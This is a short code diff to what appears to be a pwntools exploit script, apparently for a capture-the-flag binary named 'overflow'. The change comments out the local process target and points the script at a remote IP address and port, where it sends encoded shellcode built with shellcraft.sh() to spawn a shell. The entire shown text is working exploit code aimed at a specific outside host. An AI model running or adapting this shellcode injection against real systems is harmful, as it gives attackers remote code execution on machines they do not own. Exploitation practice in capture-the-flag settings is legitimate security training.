@@ -13,7 +13,8 @@ def send_shellcode(p):
     print(p.recvuntil("Input shellcode:"))
     p.sendline(encoder.line(asm(shellcraft.sh())))
 
-p = process('./overflow')
+#p = process('./overflow')
+p = remote('139.59.137.39', 13337)
 
 send_shellcode(p)
 execute_shellcode(p)
